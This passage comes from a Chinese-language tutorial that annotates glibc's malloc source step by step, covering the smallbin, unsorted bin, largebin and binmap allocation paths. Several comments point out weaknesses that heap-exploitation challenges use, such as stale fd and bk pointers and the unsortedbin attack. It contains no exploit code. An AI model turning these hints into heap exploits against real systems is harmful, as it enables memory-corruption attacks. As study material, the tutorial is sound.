获取当前堆块的前一个堆块</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (bck-&gt;fd != victim, <span class="number">0</span>))  <span class="comment">// 检查 bck -&gt; fd 是否指向 victim (链表完整性检查)</span></span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	set_inuse_bit_at_offset(victim, nb);  <span class="comment">// 将 victim 下一个相邻的堆块的 P 标志位置 1</span></span><br><span class="line">	bin-&gt;bk = bck;</span><br><span class="line">	bck-&gt;fd = bin;    <span class="comment">// 将最后一个堆块从 smallbin 中卸下，注意这里没有清空 fd、bk 指针，pwn 题中的信息泄露一般是基于此处</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (av != &amp;main_arena)    <span class="comment">// 检查当前分配区是否为主分配区</span></span><br><span class="line">	  victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);   <span class="comment">// 返回堆块</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>引用 malloc.c 给出的注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">    hold one size each, no searching within bins is necessary.</span><br><span class="line">    (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">    processed to find best fit. But for small ones, fits are exact</span><br><span class="line">    anyway, so we can check now, which is faster.)</span><br></pre></td></tr></table></figure></div>

<p>首先要判断 nb 是否在 smallbin 范围内，如果是，则计算其在 smallbin 中的 index 并根据 index 找到链表的表头，接着是一个关键判断，通过 if (victim &#x3D;&#x3D; 0) 进行初始化检查，这是由于 (victim &#x3D; last(bin)) !&#x3D; bin 执行后 victim 有两种情况，一是 smallbin 不为空，即找到了一个合适的堆块，二是 smallbin 还没有初始化成双向循环链表，这时就要调用 malloc_consolidate 来合并 fastbin chunk 到 smallbin 中(后面会提到)。</p>
<p>如果找到了一块合适的内存，先找到它的上一个堆块 bck(victim -&gt; bk)，然后进行一次完整性判断，要求 bck 的 fd 指针指向 victim，如果检查通过，会将 victim 物理上相邻的下一个堆块的 P 标志位(PREV_INUSE)置 1，最后把 victim 从链表中卸下(通常使用 unlink 函数，但是为了效率这里没有使用)并返回。 通过分析代码也能发现 smallbin 的分配方式的确是尾部取出。</p>
<p>若 smallbin 为空会移交到下一部分代码处理。</p>
<p>有关于从 smallbin 中分配堆块的思路可以参考下面这张图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_5.png"
                      alt="malloc_free_5.png"
                ></p>
<p><strong>第三条：</strong> nb 属于 largebin 范围 or 之前的分配请求失败</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    idx = largebin_index(nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">      malloc_consolidate(av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>首先判断 nb 在 large bin 中的 index，接着判断 fastbin 中是否存在 chunk，若存在，调用 malloc_consolidate 将 fastbin chunk 进行合并。引用 malloc.c 中的注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If this is a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing if there is space available, this avoids</span><br><span class="line">     fragmentation problems normally associated with fastbins.</span><br><span class="line">     Also, in practice, programs tend to have runs of either small or</span><br><span class="line">     large requests, but less often mixtures, so consolidation is not</span><br><span class="line">     invoked all that often in most programs. And the programs that</span><br><span class="line">     it is called frequently in otherwise tend to fragment.</span><br></pre></td></tr></table></figure></div>

<p>大概意思是如果 nb 是一个分配大片内存的申请，首先会合并 fastbin 中的 chunk，这样做的目的是避免内存碎片化过于严重。</p>
<blockquote>
<p>为什么不直接去 largebin 中取堆块，而是要先进行堆块合并？如果代码运行到这里，就说明用户申请的内存一定是 largebin 或者更大，如果在获取了 largebin index 之后直接搜索 largebin，很可能在对应位置上并不存在合适的堆块，这样，就需要向操作系统申请另一片空间来实现内存分配，当用户申请的堆块确实很大时这样做并没有什么问题，但是当用户申请的内存并不是那么大，将其他链表中(主要是 fastbin)的堆块合并之后恰好能够满足空间要求，那么就可以避免向操作系统申请内存，提升效率的同时还降低了堆的碎片化程度。</p>
</blockquote>
<p><strong>注意！</strong>只有当 nb 是一个 largebin request 时，才会执行上面的代码，其他情况(例如上面两条路中分配失败的情况)会下沉到下面的代码中处理，接下来的代码属于 malloc 的核心部分，使用了很多循环嵌套，其实这些复杂的算法主要目的就是处理之前没有分配成功的 smallbin、fastbin、largebin 等请求。</p>
<p>引用 malloc.c 的注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Process recently freed or remaindered chunks, taking one only if</span><br><span class="line">    it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="line">    the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="line">    bins.  Note that this step is the only place in any routine where</span><br><span class="line">    chunks are placed in bins.</span><br><span class="line"></span><br><span class="line">    The outer loop here is needed because we might not realize until</span><br><span class="line">    near the end of malloc that we should have consolidated, so must</span><br><span class="line">    do so and retry. This happens at most once, and only when we would</span><br><span class="line">    otherwise need to expand memory to service a &quot;small&quot; request.</span><br></pre></td></tr></table></figure></div>

<p>最后一句说明了进行堆块合并的原因，避免由一个较小的内存请求去向操作系统申请新的内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;) &#123;    <span class="comment">// 主循环开始</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;  <span class="comment">// 反向循环遍历 unsorted bin</span></span><br><span class="line">      bck = victim-&gt;bk; <span class="comment">// 找到 unsorted bin 链表最后一个堆块的前一个堆块</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	  || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))  <span class="comment">// 判断 size 是否合法</span></span><br><span class="line">	malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">			 chunk2mem (victim));</span><br><span class="line">      size = chunksize(victim);  <span class="comment">// 如果合法，就把 victim -&gt; size 赋给 size</span></span><br></pre></td></tr></table></figure></div>

<p>上面这段代码主要在遍历搜索 unsorted bin，引用 malloc.c 的注释如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If a small request, try to use last remainder if it is the</span><br><span class="line">	 only chunk in unsorted bin.  This helps promote locality for</span><br><span class="line">	 runs of consecutive small requests. This is the only</span><br><span class="line">	 exception to best-fit, and applies only when there is</span><br><span class="line">	 no exact fit for a small chunk.</span><br></pre></td></tr></table></figure></div>

<p>当遍历到一个堆块后，会继续执行下面的代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">	  bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">	  victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">	  (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;  <span class="comment">// 是否切割的判断条件</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* split and reattach remainder */</span></span><br><span class="line">	remainder_size = size - nb;    <span class="comment">// 计算切割后剩余的堆块大小</span></span><br><span class="line">	remainder = chunk_at_offset(victim, nb);    <span class="comment">// 切割堆块</span></span><br><span class="line">	unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;  <span class="comment">// 将剩余的堆块重新链接到 unsorted bin 中</span></span><br><span class="line">	av-&gt;last_remainder = remainder;  <span class="comment">// 重新设置分配区的 last_remainder </span></span><br><span class="line">	remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);  <span class="comment">// 更新 remainder 的 fd、bk 指针</span></span><br><span class="line">	<span class="keyword">if</span> (!in_smallbin_range(remainder_size))  <span class="comment">// 如果 remainder 是 largebin chunk，由于不在 larbebin 链表中，先清空fd_nextsize和bk_nextsize</span></span><br><span class="line">	  &#123;</span><br><span class="line">	    remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	set_head(victim, nb | PREV_INUSE |</span><br><span class="line">		 (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	set_foot(remainder, remainder_size);   <span class="comment">// 设置堆块的结构</span></span><br><span class="line"></span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);    <span class="comment">// 返回堆块</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></div>

<p>重点在于判断条件，nb 在 smallbin 范围内，并且 unsorted bin 中只有一个堆块，并且这个堆块是当前分配区的 last_remainder，并且 nb 小于这个堆块的 size，只有满足了以上四个条件，才能对 unsortedbin 中的堆块进行切割，形成 remainder。</p>
<p>如果上述条件不满足，就不会对 unsortedbin chunk 进行切割，而是运行下面的代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);    <span class="comment">// 这两句代码实现了将 unsortedbin 最后一个堆块卸下的操作，注意没有使用标准的 unlink，这是 pwn 题中比较常见的 unsortedbin attack 实现基础</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb) &#123;    <span class="comment">// 判断这个堆块是否精确匹配</span></span><br><span class="line">	set_inuse_bit_at_offset(victim, size);</span><br><span class="line">	<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	  victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);    <span class="comment">// 精确匹配的情况，直接返回给用户</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>unsortedbin chunk 精确匹配的情况，和 smallbin 一样，也是从尾部取出堆块。</p>
<p>如果取出的堆块不能精确匹配 nb 的话，就会将这个堆块放置在对应的 bin 中，所以遍历 unsortedbin 的过程也是清空它的过程。</p>
<p>unsorted bin 分配堆块的过程可以用下面的图片表示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_6.png"
                      alt="malloc_free_6.png"
                ></p>
<p>如果取出的堆块不能精确匹配 nb，就会执行下面的代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">	victim_index = smallbin_index(size);</span><br><span class="line">	bck = bin_at(av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	victim_index = largebin_index(size);</span><br><span class="line">	bck = bin_at(av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">	<span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">	  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">	  size |= PREV_INUSE;</span><br><span class="line">	  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">	  assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">	  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">	    fwd = bck;</span><br><span class="line">	    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">	    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">	    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">	    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="keyword">else</span> &#123;</span><br><span class="line">	    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">	    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">	      &#123;</span><br><span class="line">		fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">		assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">	      &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">	      <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">	      fwd = fwd-&gt;fd;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	      &#123;</span><br><span class="line">		victim-&gt;fd_nextsize = fwd;</span><br><span class="line">		victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">		fwd-&gt;bk_nextsize = victim;</span><br><span class="line">		victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">	      &#125;</span><br><span class="line">	    bck = fwd-&gt;bk;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">	  victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS	10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p>上面的代码实现了很简单的功能，如果 size 在 smallbin 范围内，先确定 size 属于哪一条链表，由于 smallbin 的头部插入、尾部取出的特性，所以把表头作为 bck，表头的下一个堆块作为 fwd，最下面的几句代码负责将堆块插入双向链表(学过数据结构的同学应该很熟悉了)。</p>
<p>不过对于 largebin 范围内的 size 情况就不那么简单了，由于 largebin 特殊的结构，想把一个堆块插入到合适的位置是比较复杂的，所以要判断很多的条件来保证效率和正确性。</p>
<p>在遍历 unsorted bin 的循环中有一个 iter 变量，它用来记录当前已经处理了多少个 unsortedbin chunk，为了防止链表中的 chunk 过多导致程序一直处理 unsortedbin，当 iter 超过 10000 时就会跳出循环。</p>
<p>如果前面的代码都不能分配出合适的堆块，那就说明用户的请求可能是 large request，或者 fastbin、smallbin、unsortedbin 都不存在合适的堆块，接下来 ptmalloc 就会开始搜索 largebin，尝试匹配一个合适的堆块。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;    <span class="comment">// 判断 nb 是不是 smallbin</span></span><br><span class="line">      bin = bin_at(av, idx);    <span class="comment">// 获取链表 (idx 是之前计算的 nb 在 largebin 链表的 index)</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">	  (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;  <span class="comment">// 检查对应的链表是否为空，或者其中最大的堆块比 nb 还小？</span></span><br><span class="line"></span><br><span class="line">	victim = victim-&gt;bk_nextsize;</span><br><span class="line">	<span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">		(<span class="type">unsigned</span> <span class="type">long</span>)(nb)))    <span class="comment">// 开始遍历 largebin，尝试找到一个合适的堆块</span></span><br><span class="line">	  victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">	   list does not have to be rerouted.  */</span></span><br><span class="line">	<span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">	  victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">	remainder_size = size - nb;  <span class="comment">// 找到一个合适的堆块，计算一下切割后剩余的堆块大小</span></span><br><span class="line">	unlink(victim, bck, fwd);   <span class="comment">// 将这个堆块从 largebin 卸下</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Exhaust */</span></span><br><span class="line">	<span class="keyword">if</span> (remainder_size &lt; MINSIZE)  &#123;    <span class="comment">// 如果切割后剩下的堆块大小 小于最小的堆块(16 or 32) 这个堆块会直接返回给用户，例如 64 位系统，切割剩余的大小为 16，那么用户拿到的堆块中有16 个字节是多出来的(或者说是浪费掉的)</span></span><br><span class="line">	  set_inuse_bit_at_offset(victim, size);</span><br><span class="line">	  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Split */</span></span><br><span class="line">	<span class="keyword">else</span> &#123;     <span class="comment">// 如果切割剩余的堆块大小大于 MINSIZE</span></span><br><span class="line">	  remainder = chunk_at_offset(victim, nb);</span><br><span class="line">	  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">	     have to perform a complete insert here.  */</span></span><br><span class="line">	  bck = unsorted_chunks(av);</span><br><span class="line">	  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	  remainder-&gt;bk = bck;</span><br><span class="line">	  remainder-&gt;fd = fwd;</span><br><span class="line">	  bck-&gt;fd = remainder;</span><br><span class="line">	  fwd-&gt;bk = remainder;    <span class="comment">// 将切割剩余的部分插入到 unsortedbin 中</span></span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">	    &#123;</span><br><span class="line">	      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;  <span class="comment">// 如果剩下的大小是 largebin，清除它的 fd_nextsize、bk_nextsize 指针(因为它们在 uunsortedbin 中无用)</span></span><br><span class="line">	    &#125;</span><br><span class="line">	  set_head(victim, nb | PREV_INUSE |</span><br><span class="line">		   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	  set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	  set_foot(remainder, remainder_size);</span><br><span class="line">	&#125;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);   <span class="comment">// 返回堆块</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>上面的代码用来搜索 largebin 尝试找到合适的堆块，注意 largebin 每个链表所存储的是一定范围的堆块，当找到一个合适大小的堆块时，为了不调整 chunksize 链表，需要避免将 chunk size 链表中的节点取出，所以取 victim-&gt;fd 节点对应的 chunk 作为候选 chunk。由于 large bin 链表中的 chunk 也是按大小排序，同一大小的 chunk 有多个时，这些 chunk 必定排在一起，所以 victim-&gt;fd 节点对应的 chunk 的大小必定与 victim 的大小一样。</p>
<p>如果切割后剩下的堆块大小 小于最小的堆块(16 or 32) 这个堆块会直接返回给用户，例如 64 位系统，切割剩余的大小为 16，那么用户拿到的堆块中有16 个字节是多出来的(或者说是浪费掉的)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">++idx;</span><br><span class="line">    bin = bin_at(av,idx);</span><br><span class="line">    block = idx2block(idx);</span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">    bit = idx2bit(idx);</span><br></pre></td></tr></table></figure></div>

<p>如果当前链表没有堆块能够满足，就将 idx 加一，目的是移动到下一个 largebin 链表，并且获取这个链表对应的 binmap 中的值，binmap 是分配区当中的一个成员，它用来标识相应的链表中是否存在空闲 chunk，利用 binmap 可以加快查找 chunk 的速度。 这段代码用来查询比 nb 大的链表中是否存在可用的 chunk。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;  <span class="comment">// 进入循环</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;   <span class="comment">// 首先判断 bit 是否大于 map，或者 bit 等于 0？</span></span><br><span class="line">	<span class="keyword">do</span> &#123;    <span class="comment">// 循环遍历每个 block，尝试找到一个符合条件的 block</span></span><br><span class="line">	  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE)  <span class="comment">/* out of bins */</span> </span><br><span class="line">	    <span class="keyword">goto</span> use_top;</span><br><span class="line">	&#125; <span class="keyword">while</span> ( (<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">	bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;  <span class="comment">// 在 block 中寻找一个不为零的 bit，这个 bit 对应的 bin 中就存在空闲 chunk</span></span><br><span class="line">	bin = next_bin(bin);</span><br><span class="line">	bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	assert(bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">      victim = last(bin);  <span class="comment">// 将上一步找到的 bin 的最后一个堆块取出</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin) &#123;  <span class="comment">// 判断取出的是不是表头，如果是，说明 bit 命中失败，需要进行调整。</span></span><br><span class="line">	av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span>  <span class="comment">// 清除之前设置的标志位</span></span><br><span class="line">	bin = next_bin(bin);    <span class="comment">// 获取当前 bin 的下一个 bin，</span></span><br><span class="line">	bit &lt;&lt;= <span class="number">1</span>;    <span class="comment">// 将 bit 转移到下一个 bin 的 bit 范围</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;  </span><br><span class="line">	size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">	assert((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));  <span class="comment">// 如果上面取出的 chunk 不是表头，那么这个 chunk 的大小一定大于 nb！</span></span><br><span class="line"></span><br><span class="line">	remainder_size = size - nb;  <span class="comment">// 和之前的代码一样，计算切割后的 chunk 大小</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* unlink */</span>    <span class="comment">// 下面的注释省略</span></span><br><span class="line">	unlink(victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Exhaust */</span></span><br><span class="line">	<span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">	  set_inuse_bit_at_offset(victim, size);</span><br><span class="line">	  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Split */</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	  remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">	     have to perform a complete insert here.  */</span></span><br><span class="line">	  bck = unsorted_chunks(av);</span><br><span class="line">	  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	  remainder-&gt;bk = bck;</span><br><span class="line">	  remainder-&gt;fd = fwd;</span><br><span class="line">	  bck-&gt;fd = remainder;</span><br><span class="line">	  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">	  <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">	    av-&gt;last_remainder = remainder;</span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">	    &#123;</span><br><span class="line">	      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  set_head(victim, nb | PREV_INUSE |</span><br><span class="line">		   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	  set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	  set_foot(remainder, remainder_size);</span><br><span class="line">	&#125;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);  <span class="comment">// 返回堆块</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>以上的代码用来处理三种情况，一是 nb 在 smallbin 范围内，二是之前的 largebin 为空，三是之前的 largebin 不为空，但是其中最大的堆块都要比 nb 小。</p>
<p>代码的后半部分和前面的代码类似，区别在于头部引入了 binmap，它是定义在分配区中的成员，具体介绍在上面写过，这段代码的主要功能是遍历剩下的 largebin，直到找到一个包含满足要求的堆块的 bin，并且取出这个 chunk 进行切割，比较难以理解的是针对 binmap 的操作，之所以引入这个东西，是为了加快遍历 largebin 的速度。</p>
<blockquote>
